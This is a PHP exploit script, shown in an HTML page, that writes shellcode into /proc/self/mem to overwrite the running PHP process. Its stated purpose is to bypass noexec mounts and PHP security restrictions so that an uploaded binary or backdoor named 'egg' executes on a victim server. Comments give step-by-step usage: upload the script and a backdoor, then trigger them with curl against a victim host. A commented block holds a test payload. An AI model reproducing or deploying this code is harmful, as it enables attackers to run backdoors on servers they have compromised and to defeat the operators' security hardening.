<html><body><pre>
<?php
// Circumvent noexec mount flag and most (all?) PHP security features.
// Allows execution of abritary binaries by re-writing the .text of the running
// PHP process.
//
// Useful on systems where all writeable filesystems are mounted with nonexec
// and PHP has been configured to disallow 
//
// Usage:
//   1. Upload _this_ script to "memexec.php"
//   2. Upload any binary/backdoor to "egg".
//
// Type `curl -SsfL https://victim.org/memexec.php` to execute 'egg'.
// - 'egg' does not need to be +x
// - 'egg' can be on a noexec-partition
// - 'egg' does not need root
//
// Note: php-fpm will return an error but the binary will execute regardless

/*
// Test "Vulnerability": cut & paste this to into any shell
cat >egg<<-'EOF'
#! /bin/bash
touch /tmp/b00m
echo -e '\e[1;31mSUCCESS\e[0m'
date
id
EOF
php memexec.php
ls -al /tmp/b00m
*/


$sc = "";
$sc .= "6865676700b83f0100004889e74831f60f054989c0b8020000004889e74831f60f054989c14881ec000400004831c04c89cf4889e6ba000400000f054883f8007e0f4889c2b8010000004c89c70f05ebd4";
$sc .= "b842010000";    // mov 0x142, %eax
$sc .= "4c89c7";        // mov %r8, %rdi
$sc .= "6a00";          // pushq $0x00
$sc .= "4889e6";        // mov %rsp,%rsi
$sc .= "4889e2";        // mov %rsp, %rdx
$sc .= "4831c9";        // xor %rcx,%rcx
$sc .= "4d31c9";        // xor %r9,%r9
$sc .= "4d31d2";        // xor %r10,%r10
$sc .= "41b800100000";  // mov $0x1000, %r8d
$sc .= "0f05b83c0000004831ff0f05";
$f = fopen("/proc/self/mem", "w");
$a = explode(" ", fgets(fopen("/proc/self/syscall", "r")));
fseek($f, hexdec($a[8]));
fwrite($f, hex2bin($sc));
fgets($f);  // We overwrite .text after this syscall.
exit(0);
?>
